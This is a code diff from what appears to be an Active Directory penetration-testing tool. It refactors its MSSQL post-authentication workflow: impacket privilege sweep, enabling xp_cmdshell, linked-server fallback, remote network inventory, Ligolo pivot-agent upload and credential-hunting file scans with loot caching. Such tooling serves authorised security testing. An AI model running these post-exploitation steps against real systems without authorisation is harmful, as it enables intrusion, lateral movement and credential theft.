@@ -27,19 +27,13 @@ from adscan_internal import (
     telemetry,
 )
 from adscan_internal.integrations.mssql import (
-    MSSQLContext,
-    MSSQLRunner,
+    ImpacketMSSQLBackend,
+    XpCmdshellStatus,
+    is_hash_authentication,
     parse_xp_cmdshell_enable_failure_reason,
-    parse_link_xpcmd_execution_success,
-    parse_link_xpcmd_identity,
-)
-from adscan_internal.execution_outcomes import (
-    build_no_result_completed_process,
-    build_timeout_completed_process,
+    print_mssql_sweep_card,
 )
 from adscan_internal.cli.common import build_lab_event_fields
-from adscan_internal.cli.winrm import _collect_winrm_pivot_candidates
-from adscan_internal.path_utils import get_adscan_home
 from adscan_internal.rich_output import mark_sensitive
 from adscan_internal.services.exploitation import ExploitationService
 from adscan_internal.services.exploitation.remote_windows_execution import (
@@ -52,16 +46,19 @@ from adscan_internal.services.ai_backend_availability_service import (
 from adscan_internal.services.pivot_opportunity_service import (
     ensure_host_bound_workflow_target_viable,
 )
+from adscan_internal.services.pivot_reachability_candidate_service import (
+    collect_pivot_reachability_candidates,
+)
 from adscan_internal.services.pivot_service import orchestrate_ligolo_pivot_tunnel
 from adscan_internal.services.post_pivot_followup_service import (
     PivotExecutionContext,
     maybe_offer_post_pivot_owned_followup,
+    maybe_offer_post_pivot_trust_followup_from_targets,
     refresh_network_inventory_after_pivot,
     render_post_pivot_reachability_delta,
 )
 from adscan_internal.services.smb_sensitive_file_policy import (
     SMB_SENSITIVE_SCAN_PHASE_DOCUMENT_CREDENTIALS,
-    SMB_SENSITIVE_SCAN_PHASE_HEAVY_ARTIFACTS,
     SMB_SENSITIVE_SCAN_PHASE_TEXT_CREDENTIALS,
     get_production_sensitive_scan_phase_sequence,
     get_sensitive_file_extensions,
@@ -92,6 +89,15 @@ from adscan_internal.services.windows_ai_sensitive_analysis_service import (
 from adscan_internal.text_utils import strip_ansi_codes
 from rich.prompt import Confirm
 from rich.table import Table
+from adscan_core.output._panels import print_panel
+from adscan_core.theme import (
+    BOX_ROUNDED as _BOX_ROUNDED,
+    COLOR_AMBER as _COLOR_AMBER,
+    COLOR_CRIMSON as _COLOR_CRIMSON,
+    COLOR_MUTED as _COLOR_MUTED,
+    COLOR_STEEL as _COLOR_STEEL,
+)
+from rich.text import Text as RichText
 
 
 class MssqlShell(Protocol):
@@ -178,7 +184,11 @@ def _execute_powershell_via_mssql(
         timeout=300,
     )
     if not result.success and not result.stdout:
-        raise RuntimeError(result.error_message or result.stderr or "MSSQL PowerShell execution failed.")
+        raise RuntimeError(
+            result.error_message
+            or result.stderr
+            or "MSSQL PowerShell execution failed."
+        )
     if result.stderr:
         _stderr_preview = str(result.stderr or "").strip()[:400]
         print_info_debug(
@@ -326,11 +336,15 @@ def _parse_mssql_ipconfig_interfaces(stdout: str) -> list[dict[str, Any]]:
             current_interface = stripped[:-1].strip()
             pending_ipv4 = None
             continue
-        ip_match = re.search(r"IPv4 Address[^\:]*:\s*([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)", line)
+        ip_match = re.search(
+            r"IPv4 Address[^\:]*:\s*([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)", line
+        )
         if ip_match:
             pending_ipv4 = ip_match.group(1)
             continue
-        mask_match = re.search(r"Subnet Mask[^\:]*:\s*([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)", line)
+        mask_match = re.search(
+            r"Subnet Mask[^\:]*:\s*([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)", line
+        )
         if pending_ipv4 and mask_match:
             prefix_length = _convert_subnet_mask_to_prefix_length(mask_match.group(1))
             if pending_ipv4 != "127.0.0.1" and not pending_ipv4.startswith("169.254."):
@@ -345,10 +359,14 @@ def _parse_mssql_ipconfig_interfaces(stdout: str) -> list[dict[str, Any]]:
     return interfaces
 
 
-def _parse_mssql_route_print(stdout: str, interfaces: list[dict[str, Any]]) -> list[dict[str, Any]]:
+def _parse_mssql_route_print(
+    stdout: str, interfaces: list[dict[str, Any]]
+) -> list[dict[str, Any]]:
     """Parse IPv4 routes from one ``route print -4`` output."""
     interface_alias_by_ip = {
-        str(entry.get("IPAddress") or "").strip(): str(entry.get("InterfaceAlias") or "").strip()
+        str(entry.get("IPAddress") or "").strip(): str(
+            entry.get("InterfaceAlias") or ""
+        ).strip()
         for entry in interfaces
         if str(entry.get("IPAddress") or "").strip()
     }
@@ -369,7 +387,10 @@ def _parse_mssql_route_print(stdout: str, interfaces: list[dict[str, Any]]) -> l
             continue
         if re.match(r"^\s*(Persistent Routes:|====)", line):
             break
-        if re.match(r"^\s*Network Destination\s+Netmask\s+Gateway\s+Interface\s+Metric\s*$", line):
+        if re.match(
+            r"^\s*Network Destination\s+Netmask\s+Gateway\s+Interface\s+Metric\s*$",
+            line,
+        ):
             continue
         match = route_pattern.match(line)
         if not match:
@@ -416,7 +437,9 @@ def _collect_mssql_network_inventory(
         timeout=180,
     )
     if not ipconfig_result.success:
-        raise RuntimeError(ipconfig_result.error_message or "MSSQL ipconfig execution failed.")
+        raise RuntimeError(
+            ipconfig_result.error_message or "MSSQL ipconfig execution failed."
+        )
     route_result = remote_executor.execute_command(
         auth,
         "route print -4",
@@ -425,7 +448,9 @@ def _collect_mssql_network_inventory(
         timeout=180,
     )
     if not route_result.success:
-        raise RuntimeError(route_result.error_message or "MSSQL route print execution failed.")
+        raise RuntimeError(
+            route_result.error_message or "MSSQL route print execution failed."
+        )
     interfaces = _parse_mssql_ipconfig_interfaces(ipconfig_result.stdout)
     routes = _parse_mssql_route_print(route_result.stdout, interfaces)
     return {
@@ -499,47 +524,6 @@ def _summarize_mssql_pivot_inventory(
     return _summarize_winrm_pivot_inventory(entries, route_mode=route_mode)
 
 
-def _build_mssql_context(shell: MssqlShell) -> MSSQLContext:
-    if not shell.netexec_path:
-        raise ValueError("netexec_path not configured")
-
-    def _infer_domain_from_command(command: str) -> str | None:
-        import shlex
-
-        try:
-            argv = shlex.split(str(command or ""))
-        except ValueError:
-            return None
-        for idx, token in enumerate(argv):
-            if token in {"-d", "--domain"} and idx + 1 < len(argv):
-                value = str(argv[idx + 1]).strip()
-                if value:
-                    return value
-        return None
-
-    def _runner(command: str, timeout: int):
-        domain = _infer_domain_from_command(command)
-        if hasattr(shell, "_run_netexec"):
-            result = shell._run_netexec(
-                command,
-                domain=domain,
-                timeout=timeout,
-                operation_kind="mssql_remote_exec",
-                service="mssql",
-                target_count=1,
-            )
-        else:
-            result = shell.run_command(command, timeout=timeout)
-        if result is not None:
-            return result
-        last_error = getattr(shell, "_last_run_command_error", None)
-        if isinstance(last_error, tuple) and last_error and last_error[0] == "timeout":
-            return build_timeout_completed_process(command, tool_name="netexec_mssql")
-        return build_no_result_completed_process(command, tool_name="netexec_mssql")
-
-    return MSSQLContext(netexec_path=shell.netexec_path, command_runner=_runner)
-
-
 def _get_workspace_dir(shell: MssqlShell) -> str:
     """Return the active workspace directory for persisted MSSQL artifacts."""
     resolver = getattr(shell, "_get_workspace_cwd", None)
@@ -609,13 +593,11 @@ def _fetch_mssql_phase_files(
         file_targets=file_targets,
         download_dir=loot_dir,
         workspace_type=str(getattr(shell, "type", "") or "").strip().lower() or None,
-        file_fetcher=lambda remote_path, save_path: (
-            _download_mssql_target(
-                remote_executor=remote_executor,
-                auth=auth,
-                remote_path=remote_path,
-                local_path=save_path,
-            )
+        file_fetcher=lambda remote_path, save_path: _download_mssql_target(
+            remote_executor=remote_executor,
+            auth=auth,
+            remote_path=remote_path,
+            local_path=save_path,
         ),
     )
     if result.per_file_failures:
@@ -656,45 +638,61 @@ def _run_mssql_ai_sensitive_data_scan(
         secret=password,
         linked_server=execution_path.linked_server,
     )
-    return WindowsAISensitiveAnalysisService().execute(
-        shell,
-        domain=domain,
-        host=host,
-        username=username,
-        entries=entries,
-        run_root_abs=run_root_abs,
-        workflow_label="MSSQL",
-        source_share="mssql",
-        artifact_transport_folder="mssql",
-        select_scope=lambda current_shell: WindowsSensitiveScanPolicyService().select_ai_triage_scope(
-            shell=current_shell
-        ),
-        should_inspect_prioritized_files=lambda current_shell: WindowsSensitiveScanPolicyService().should_inspect_ai_prioritized_files(
-            shell=current_shell,
-            workflow_label="MSSQL",
-        ),
-        should_continue_after_findings=lambda current_shell, current_domain: WindowsSensitiveScanPolicyService().should_continue_after_ai_findings(
-            shell=current_shell,
-            domain=current_domain,
-            workflow_label="MSSQL",
-            skip_for_pwned_ctf=_is_ctf_domain_pwned(current_shell, current_domain),
-        ),
-        skip_for_pwned_ctf=_is_ctf_domain_pwned,
-        fetch_selected_entries=lambda selected_entries, loot_dir: _fetch_mssql_phase_files(
+    return (
+        WindowsAISensitiveAnalysisService()
+        .execute(
             shell,
-            remote_executor=remote_executor,
-            auth=auth,
-            selected_entries=selected_entries,
-            loot_dir=loot_dir,
-        ),
-        render_findings_table=lambda current_shell, candidate, findings, source_label: _render_file_credentials_table(
-            current_shell,
-            candidate=candidate,
-            findings=findings,
-            source_label=source_label,
-        ),
-        handle_findings_actions=_handle_prioritized_findings_actions,
-    ).to_dict()
+            domain=domain,
+            host=host,
+            username=username,
+            entries=entries,
+            run_root_abs=run_root_abs,
+            workflow_label="MSSQL",
+            source_share="mssql",
+            artifact_transport_folder="mssql",
+            select_scope=lambda current_shell: (
+                WindowsSensitiveScanPolicyService().select_ai_triage_scope(
+                    shell=current_shell
+                )
+            ),
+            should_inspect_prioritized_files=lambda current_shell: (
+                WindowsSensitiveScanPolicyService().should_inspect_ai_prioritized_files(
+                    shell=current_shell,
+                    workflow_label="MSSQL",
+                )
+            ),
+            should_continue_after_findings=lambda current_shell, current_domain: (
+                WindowsSensitiveScanPolicyService().should_continue_after_ai_findings(
+                    shell=current_shell,
+                    domain=current_domain,
+                    workflow_label="MSSQL",
+                    skip_for_pwned_ctf=_is_ctf_domain_pwned(
+                        current_shell, current_domain
+                    ),
+                )
+            ),
+            skip_for_pwned_ctf=_is_ctf_domain_pwned,
+            fetch_selected_entries=lambda selected_entries, loot_dir: (
+                _fetch_mssql_phase_files(
+                    shell,
+                    remote_executor=remote_executor,
+                    auth=auth,
+                    selected_entries=selected_entries,
+                    loot_dir=loot_dir,
+                )
+            ),
+            render_findings_table=lambda current_shell, candidate, findings, source_label: (
+                _render_file_credentials_table(
+                    current_shell,
+                    candidate=candidate,
+                    findings=findings,
+                    source_label=source_label,
+                )
+            ),
+            handle_findings_actions=_handle_prioritized_findings_actions,
+        )
+        .to_dict()
+    )
 
 
 def _download_mssql_target(
@@ -764,45 +762,73 @@ def _run_mssql_filesystem_mapping(
     )
     mapping_service = WindowsFileMappingService()
 
-    def _executor(script: str) -> WindowsPowerShellExecutionResult:
-        result = remote_executor.execute_powershell(
-            auth,
-            script,
-            operation_name="mssql_sensitive_file_map",
-            preferred_transport="mssql",
-            timeout=300,
-        )
-        return WindowsPowerShellExecutionResult(
-            stdout=result.stdout,
-            stderr=result.stderr or (result.error_message or ""),
-            had_errors=not result.success,
-        )
+    # ── Mapping cache check ───────────────────────────────────────────────────
+    from adscan_internal.services.windows_loot_cache_service import try_use_mapping_cache
 
-    started_at = time.perf_counter()
-    try:
-        mapping_result = mapping_service.generate_file_map(
-            command_executor=_executor,
-            output_path=output_path,
-            metadata={
-                "transport": "mssql",
-                "execution_mode": execution_path.mode,
-                "linked_server": execution_path.linked_server,
-                "identity": execution_path.identity,
-            },
-        )
-    except WindowsFileMappingError as exc:
-        telemetry.capture_exception(exc)
-        print_error(f"MSSQL filesystem mapping failed: {exc}")
-        return {"completed": False, "error": str(exc)}
+    workspace_type_mssql = str(getattr(shell, "type", "") or "").strip().lower()
 
-    entries = list(mapping_result.get("entries") or [])
-    duration = time.perf_counter() - started_at
-    print_success(
-        "Deterministic MSSQL filesystem mapping prepared at "
-        f"{mark_sensitive(output_path, 'path')} with {len(entries)} file entries "
-        f"in {duration:.2f}s."
+    def _mssql_loader() -> "tuple[int, dict] | None":
+        data = mapping_service.load_file_map(input_path=output_path)
+        entries = list(data.get("entries") or [])
+        if not entries:
+            return None
+        return len(entries), data
+
+    mapping_result: dict[str, object] | None = try_use_mapping_cache(
+        shell,
+        manifest_path=output_path,
+        workspace_type=workspace_type_mssql,
+        transport_label="MSSQL",
+        loader=_mssql_loader,
     )
+    if mapping_result is not None:
+        print_info(
+            "Using cached MSSQL filesystem mapping from "
+            f"{mark_sensitive(output_path, 'path')} "
+            f"({len(list(mapping_result.get('entries') or []))} file entries)."
+        )
 
+    if mapping_result is None:
+        def _executor(script: str) -> WindowsPowerShellExecutionResult:
+            result = remote_executor.execute_powershell(
+                auth,
+                script,
+                operation_name="mssql_sensitive_file_map",
+                preferred_transport="mssql",
+                timeout=300,
+            )
+            return WindowsPowerShellExecutionResult(
+                stdout=result.stdout,
+                stderr=result.stderr or (result.error_message or ""),
+                had_errors=not result.success,
+            )
+
+        started_at = time.perf_counter()
+        try:
+            mapping_result = mapping_service.generate_file_map(
+                command_executor=_executor,
+                output_path=output_path,
+                metadata={
+                    "transport": "mssql",
+                    "execution_mode": execution_path.mode,
+                    "linked_server": execution_path.linked_server,
+                    "identity": execution_path.identity,
+                },
+            )
+        except WindowsFileMappingError as exc:
+            telemetry.capture_exception(exc)
+            print_error(f"MSSQL filesystem mapping failed: {exc}")
+            return {"completed": False, "error": str(exc)}
+
+        duration = time.perf_counter() - started_at
+        print_success(
+            "Deterministic MSSQL filesystem mapping prepared at "
+            f"{mark_sensitive(output_path, 'path')} with "
+            f"{len(list(mapping_result.get('entries') or []))} file entries "
+            f"in {duration:.2f}s."
+        )
+
+    entries: list[object] = list((mapping_result or {}).get("entries") or [])
     run_root_abs = os.path.join(os.path.dirname(output_path), "phases")
     os.makedirs(run_root_abs, exist_ok=True)
     if mode == "ai":
@@ -816,9 +842,24 @@ def _run_mssql_filesystem_mapping(
             run_root_abs=run_root_abs,
             execution_path=execution_path,
         )
+    from adscan_internal.services.smb_sensitive_phase_orchestration_service import (
+        select_sensitive_scan_phases,
+    )
+
+    selected_phases = select_sensitive_scan_phases(
+        shell, domain=domain, transport_label="MSSQL"
+    )
+    if not selected_phases:
+        print_info("No MSSQL credential-hunt phases selected — skipping analysis.")
+        return {
+            "completed": True,
+            "output_path": output_path,
+            "entry_count": len(entries),
+            "phases_run": [],
+        }
+
     phase_sequence = get_production_sensitive_scan_phase_sequence()
     results: list[dict[str, object]] = []
-    phases_to_run = phase_sequence[:3]
     auth_for_fetch = RemoteWindowsAuth(
         domain=domain,
         host=host,
@@ -845,62 +886,77 @@ def _run_mssql_filesystem_mapping(
         )
         phase_root_abs = os.path.join(run_root_abs, phase)
         loot_dir = os.path.join(phase_root_abs, "loot")
+        loot_meta_path = os.path.join(phase_root_abs, "loot_meta.json")
         os.makedirs(loot_dir, exist_ok=True)
         print_info(
             "Running deterministic MSSQL analysis "
             f"({mark_sensitive(phase_label, 'text')}) on "
             f"{mark_sensitive(host, 'hostname')}."
         )
-        return WindowsSensitivePhaseExecutionService().execute_phase(
+        from adscan_internal.services.windows_loot_cache_service import (
+            decide_loot_cache_reuse,
+            make_cached_loot_fetcher,
+            write_loot_cache_metadata,
+        )
+
+        workspace_type = str(getattr(shell, "type", "") or "").strip().lower()
+        if decide_loot_cache_reuse(
             shell,
-            domain=domain,
-            host=host,
-            username=username,
-            phase=phase,
-            phase_label=phase_label,
-            phase_root_abs=phase_root_abs,
             loot_dir=loot_dir,
-            selected_entries_count=len(selected_entries),
-            phase_excluded_total=0,
-            fetcher=lambda: _fetch_mssql_phase_files(
-                shell,
-                remote_executor=remote_executor,
-                auth=auth_for_fetch,
-                selected_entries=selected_entries,
-                loot_dir=loot_dir,
-            ),
-            source_share="mssql",
-            source_artifact="mssql deterministic file scan",
+            meta_path=loot_meta_path,
+            phase_label=phase_label,
+            workspace_type=workspace_type,
             transport_label="MSSQL",
-        ).to_dict()
+        ):
+            phase_fetcher = make_cached_loot_fetcher(loot_dir)
+        else:
+            _loot_meta_path = loot_meta_path
 
-    first_result = _run_phase(phases_to_run[0])
-    results.append(first_result)
-    if not WindowsSensitiveScanPolicyService().should_continue_with_deeper_scan(
-        shell=shell,
-        domain=domain,
-        phase_result=first_result,
-        workflow_label="MSSQL",
-        skip_for_pwned_ctf=_is_ctf_domain_pwned(shell, domain),
-    ):
-        return {
-            "completed": True,
-            "output_path": output_path,
-            "entry_count": len(entries),
-            "phases_run": results,
-        }
+            def phase_fetcher(  # type: ignore[misc]
+                _lmpath=_loot_meta_path,
+            ):
+                result = _fetch_mssql_phase_files(
+                    shell,
+                    remote_executor=remote_executor,
+                    auth=auth_for_fetch,
+                    selected_entries=selected_entries,
+                    loot_dir=loot_dir,
+                )
+                write_loot_cache_metadata(
+                    _lmpath,
+                    file_count=len(list(result.downloaded_files)),
+                    host=host,
+                    username=username,
+                    phase=phase,
+                    transport="mssql",
+                )
+                return result
 
-    for phase in phases_to_run[1:]:
-        phase_result = _run_phase(phase)
-        results.append(phase_result)
+        return (
+            WindowsSensitivePhaseExecutionService()
+            .execute_phase(
+                shell,
+                domain=domain,
+                host=host,
+                username=username,
+                phase=phase,
+                phase_label=phase_label,
+                phase_root_abs=phase_root_abs,
+                loot_dir=loot_dir,
+                selected_entries_count=len(selected_entries),
+                phase_excluded_total=0,
+                fetcher=phase_fetcher,
+                source_share="mssql",
+                source_artifact="mssql deterministic file scan",
+                transport_label="MSSQL",
+            )
+            .to_dict()
+        )
 
-    if WindowsSensitiveScanPolicyService().should_continue_with_heavy_artifacts(
-        shell=shell,
-        domain=domain,
-        workflow_label="MSSQL",
-        skip_for_pwned_ctf=_is_ctf_domain_pwned(shell, domain),
-    ):
-        results.append(_run_phase(SMB_SENSITIVE_SCAN_PHASE_HEAVY_ARTIFACTS))
+    for phase in phase_sequence:
+        if phase not in selected_phases:
+            continue
+        results.append(_run_phase(phase))
 
     loot_root_rel = os.path.relpath(run_root_abs, _get_workspace_dir(shell))
     print_info(
@@ -929,7 +985,9 @@ def check_pivot_reachability_via_mssql(
     """Check whether an MSSQL-execution host can reach IPs hidden from the original vantage."""
     from adscan_internal.cli.winrm import _load_workspace_network_reachability_report
 
-    reachability_payload = _load_workspace_network_reachability_report(shell, domain=domain)
+    reachability_payload = _load_workspace_network_reachability_report(
+        shell, domain=domain
+    )
     if not reachability_payload:
         print_info_debug(
             "Skipping MSSQL pivot reachability check: no current-vantage reachability report is available."
@@ -941,18 +999,20 @@ def check_pivot_reachability_via_mssql(
             "Skipping MSSQL pivot reachability check: reachability report has no usable IP entries."
         )
         return
-    candidate_entries, candidate_counts, _ = _collect_winrm_pivot_candidates(
-        shell,
-        domain=domain,
+    candidate_entries, candidate_counts, _ = collect_pivot_reachability_candidates(
+        source_domain=domain,
         payload=reachability_payload,
+        domain_connectivity=getattr(shell, "domain_connectivity", {}) or {},
+        domains_data=getattr(shell, "domains_data", {}) or {},
     )
     if candidate_counts["total_count"] == 0:
         print_info(
-            "Skipping MSSQL pivot probing because there are no hidden current-vantage "
-            "or trusted-domain targets left to validate."
+            "Skipping MSSQL pivot probing because there are no hidden current-vantage, "
+            "service-hidden, or trusted-domain targets left to validate."
         )
         print_info_debug(
-            "Skipping MSSQL pivot reachability check: no host-level hidden targets or inter-domain trust targets exist."
+            "Skipping MSSQL pivot reachability check: no host-level hidden targets, "
+            "service-hidden targets, or inter-domain trust targets exist."
         )
         return
 
@@ -964,14 +1024,15 @@ def check_pivot_reachability_via_mssql(
                 "Pivot Host": host,
                 "Username": username,
                 "Host Hidden IPs": str(candidate_counts["host_hidden_count"]),
+                "Service Hidden IPs": str(candidate_counts["service_hidden_count"]),
                 "Trusted-Domain Targets": str(candidate_counts["trusted_domain_count"]),
                 "Protocol": execution_path.mode,
             },
             icon="🧭",
         )
         print_info(
-            "Assessing whether this MSSQL execution path can reach hidden current-vantage targets "
-            "and unresolved trusted-domain controllers."
+            "Assessing whether this MSSQL execution path can reach hidden hosts, service-hidden "
+            "targets, and unresolved trusted-domain controllers."
         )
         inventory_payload = _collect_mssql_network_inventory(
             shell=shell,
@@ -982,18 +1043,28 @@ def check_pivot_reachability_via_mssql(
             execution_path=execution_path,
         )
         if not isinstance(inventory_payload, dict):
-            print_warning("MSSQL network inventory returned an unexpected payload; skipping pivot reachability check.")
+            print_warning(
+                "MSSQL network inventory returned an unexpected payload; skipping pivot reachability check."
+            )
             return
         remote_interfaces = inventory_payload.get("interfaces", [])
         remote_routes = inventory_payload.get("routes", [])
-        interface_source = str(inventory_payload.get("interface_source") or "").strip() or "none"
-        route_source = str(inventory_payload.get("route_source") or "").strip() or "none"
+        interface_source = (
+            str(inventory_payload.get("interface_source") or "").strip() or "none"
+        )
+        route_source = (
+            str(inventory_payload.get("route_source") or "").strip() or "none"
+        )
         if not isinstance(remote_interfaces, list):
             remote_interfaces = []
         if not isinstance(remote_routes, list):
             remote_routes = []
-        normalized_interfaces = [entry for entry in remote_interfaces if isinstance(entry, dict)]
-        normalized_routes = [entry for entry in remote_routes if isinstance(entry, dict)]
+        normalized_interfaces = [
+            entry for entry in remote_interfaces if isinstance(entry, dict)
+        ]
+        normalized_routes = [
+            entry for entry in remote_routes if isinstance(entry, dict)
+        ]
         print_info_debug(
             "MSSQL pivot inventory summary: "
             f"interface_source={mark_sensitive(interface_source, 'text')} "
@@ -1030,7 +1101,12 @@ def check_pivot_reachability_via_mssql(
                     "route_source": route_source,
                     "summary": {
                         "hidden_target_count": candidate_counts["host_hidden_count"],
-                        "trusted_domain_target_count": candidate_counts["trusted_domain_count"],
+                        "service_hidden_target_count": candidate_counts[
+                            "service_hidden_count"
+                        ],
+                        "trusted_domain_target_count": candidate_counts[
+                            "trusted_domain_count"
+                        ],
                         "candidate_count": 0,
                         "confirmed_reachable_count": 0,
                         "same_subnet_no_response_count": 0,
@@ -1050,15 +1126,20 @@ def check_pivot_reachability_via_mssql(
             return
 
         subnet_candidates = sum(
-            1 for target in selected_targets if str(target.selection_reason).startswith("same_subnet:")
+            1
+            for target in selected_targets
+            if str(target.selection_reason).startswith("same_subnet:")
         )
         routed_candidates = len(selected_targets) - subnet_candidates
         trusted_domain_candidates = sum(
-            1 for target in selected_targets if target.origin == "trusted_domain_connectivity"
+            1
+            for target in selected_targets
+            if target.origin == "trusted_domain_connectivity"
         )
         print_info(
             f"This host may be a useful pivot for {len(selected_targets)} target(s) "
             f"({candidate_counts['host_hidden_count']} hidden current-vantage, "
+            f"{candidate_counts['service_hidden_count']} service-hidden, "
             f"{candidate_counts['trusted_domain_count']} trusted-domain, "
             f"{subnet_candidates} same-subnet, {routed_candidates} routed)."
         )
@@ -1091,9 +1172,13 @@ def check_pivot_reachability_via_mssql(
             operation_name="pivot_tcp_probe",
         )
         probe_payload = _load_mssql_json_stdout(probe_stdout)
-        targets_payload = probe_payload.get("targets", []) if isinstance(probe_payload, dict) else []
+        targets_payload = (
+            probe_payload.get("targets", []) if isinstance(probe_payload, dict) else []
+        )
         if not isinstance(targets_payload, list):
-            print_warning("MSSQL pivot probe returned an unexpected payload; skipping report rendering.")
+            print_warning(
+                "MSSQL pivot probe returned an unexpected payload; skipping report rendering."
+            )
             return
 
         confirmed_reachable: list[dict[str, Any]] = []
@@ -1103,7 +1188,9 @@ def check_pivot_reachability_via_mssql(
             if not isinstance(entry, dict):
                 continue
             reachable_ports = [
-                int(port) for port in entry.get("reachable_ports", []) if str(port).isdigit()
+                int(port)
+                for port in entry.get("reachable_ports", [])
+                if str(port).isdigit()
             ]
             reason = str(entry.get("selection_reason") or "").strip()
             if reachable_ports:
@@ -1125,6 +1212,7 @@ def check_pivot_reachability_via_mssql(
             "summary": {
                 "candidate_count": len(selected_targets),
                 "confirmed_reachable_count": len(confirmed_reachable),
+                "service_hidden_target_count": candidate_counts["service_hidden_count"],
                 "trusted_domain_target_count": candidate_counts["trusted_domain_count"],
                 "same_subnet_no_response_count": len(same_subnet_no_response),
                 "no_connectivity_confirmed_count": len(no_connectivity_confirmed),
@@ -1157,8 +1245,13 @@ def check_pivot_reachability_via_mssql(
                             for item in entry.get("hostname_candidates", [])
                         )
                         or "-",
-                        ", ".join(str(port) for port in entry.get("reachable_ports", [])) or "-",
-                        mark_sensitive(str(entry.get("selection_reason") or ""), "text"),
+                        ", ".join(
+                            str(port) for port in entry.get("reachable_ports", [])
+                        )
+                        or "-",
+                        mark_sensitive(
+                            str(entry.get("selection_reason") or ""), "text"
+                        ),
                     )
                 shell.console.print(table)
         if same_subnet_no_response:
@@ -1182,13 +1275,15 @@ def check_pivot_reachability_via_mssql(
                 username=username,
                 password=password,
                 confirmed_targets=confirmed_reachable,
-                detect_remote_architecture=lambda **_kwargs: detect_mssql_windows_architecture(
-                    shell=shell,
-                    domain=domain,
-                    host=host,
-                    username=username,
-                    password=password,
-                    execution_path=execution_path,
+                detect_remote_architecture=lambda **_kwargs: (
+                    detect_mssql_windows_architecture(
+                        shell=shell,
+                        domain=domain,
+                        host=host,
+                        username=username,
+                        password=password,
+                        execution_path=execution_path,
+                    )
                 ),
                 upload_agent=lambda **kwargs: mssql_upload(
                     shell=shell,
@@ -1222,6 +1317,11 @@ def check_pivot_reachability_via_mssql(
                     pivot_tool="Ligolo",
                     source_service="mssql",
                 )
+                maybe_offer_post_pivot_trust_followup_from_targets(
+                    shell,
+                    context=pivot_context,
+                    confirmed_targets=confirmed_reachable,
+                )
                 refresh_result = refresh_network_inventory_after_pivot(
                     shell,
                     context=pivot_context,
@@ -1254,13 +1354,15 @@ def run_mssql_postauth_workflow(
     password: str,
     workflow_intent: str = "default",
 ) -> dict[str, object]:
-    """Run the premium MSSQL post-auth workflow for low-priv and linked-server paths."""
-    if not shell.netexec_path:
-        print_error(
-            "NetExec (nxc) path not configured. Please ensure it's installed via 'adscan install'."
-        )
-        return {"completed": False, "error": "netexec_missing"}
+    """Run the premium MSSQL post-auth workflow for low-priv and linked-server paths.
 
+    This is the native-stack implementation: a single privilege sweep
+    against impacket TDS replaces the old four-call NetExec subprocess
+    chain (verify_authentication → enable_xp_cmdshell → enum_linked_servers
+    → enable_linked_xp_cmdshell). The premium sweep card is emitted up
+    front so the operator sees the full fingerprint before any
+    follow-ups run.
+    """
     marked_host = mark_sensitive(host, "hostname")
     marked_user = mark_sensitive(username, "user")
     print_operation_header(
@@ -1273,127 +1375,139 @@ def run_mssql_postauth_workflow(
         icon="🗄️",
     )
 
-    ctx = _build_mssql_context(shell)
-    runner = MSSQLRunner()
-    authenticated, auth_output = runner.verify_authentication(
-        host,
-        ctx=ctx,
-        username=username,
-        password=password,
+    backend = ImpacketMSSQLBackend(host=host)
+    sweep = backend.sweep_privileges(
         domain=domain,
-        timeout=60,
+        username=username,
+        secret=password,
+        timeout=90,
     )
-    if not authenticated:
+    if sweep is None:
         print_error(
-            f"NetExec did not confirm MSSQL authenticated access for {marked_user} on {marked_host}."
+            f"Could not authenticate to MSSQL as {marked_user} on {marked_host}."
         )
         return {
             "completed": False,
             "error": "auth_not_confirmed",
-            "auth_output": auth_output,
         }
 
     print_success(
-        f"Confirmed MSSQL authenticated access for {marked_user} on {marked_host}."
+        f"[bold]Login confirmed[/bold]  {marked_user} @ {marked_host}"
     )
+    print_mssql_sweep_card(sweep)
 
     execution_path: MssqlExecutionPath | None = None
-    xp_enabled, _xp_result = runner.enable_xp_cmdshell(
-        host,
-        ctx=ctx,
-        username=username,
-        password=password,
-        domain=domain,
-        timeout=120,
-    )
-    if xp_enabled:
-        print_success(f"xp_cmdshell enabled on {marked_host}.")
-        execution_path = MssqlExecutionPath(mode="xp_cmdshell")
-    else:
-        local_enable_reason = None
-        if _xp_result and _xp_result.stdout:
-            local_enable_reason = parse_xp_cmdshell_enable_failure_reason(_xp_result.stdout)
-        if local_enable_reason:
+
+    if sweep.xp_cmdshell == XpCmdshellStatus.ENABLED:
+        execution_path = MssqlExecutionPath(
+            mode="xp_cmdshell",
+            identity=sweep.identity.system_user or None,
+        )
+    elif sweep.is_sysadmin:
+        print_warning(
+            f"Enabling xp_cmdshell on {marked_host} "
+            "(modifies SQL Server configuration - revert with sp_configure after engagement)."
+        )
+        enable_result = backend.enable_xp_cmdshell(
+            domain=domain,
+            username=username,
+            secret=password,
+            timeout=60,
+        )
+        if enable_result.success:
             print_warning(
-                "Local xp_cmdshell enablement failed on "
-                f"{marked_host}: {mark_sensitive(local_enable_reason, 'detail')}."
+                f"[bold]xp_cmdshell enabled[/bold] on {marked_host} "
+                "(SQL Server configuration modified - revert after engagement)."
+            )
+            execution_path = MssqlExecutionPath(
+                mode="xp_cmdshell",
+                identity=sweep.identity.system_user or None,
             )
         else:
-            print_warning(f"Local xp_cmdshell was not enabled on {marked_host}.")
-        print_info(
-            "Switching to linked-server enumeration to look for an alternate command-execution path."
+            reason = parse_xp_cmdshell_enable_failure_reason(
+                enable_result.stderr or enable_result.stdout or ""
+            )
+            if reason:
+                print_warning(
+                    "Local xp_cmdshell enablement failed on "
+                    f"{marked_host}: {mark_sensitive(reason, 'detail')}."
+                )
+            else:
+                print_warning(f"Local xp_cmdshell was not enabled on {marked_host}.")
+    else:
+        print_warning(
+            f"Current principal {marked_user} is not sysadmin — local xp_cmdshell "
+            "cannot be toggled. Looking for a linked-server path."
         )
-        linked_servers, _links_result = runner.enum_linked_servers(
-            host,
-            ctx=ctx,
-            username=username,
-            password=password,
+
+    if execution_path is None and sweep.linked_servers:
+        linked_names = [ls.name for ls in sweep.linked_servers]
+        persisted_path = _persist_mssql_linked_servers(
+            shell,
             domain=domain,
-            timeout=120,
+            host=host,
+            username=username,
+            linked_servers=linked_names,
         )
-        if linked_servers:
-            persisted_path = _persist_mssql_linked_servers(
-                shell,
-                domain=domain,
-                host=host,
-                username=username,
-                linked_servers=linked_servers,
+        print_info(
+            f"Persisted linked-server inventory to {mark_sensitive(persisted_path, 'path')}."
+        )
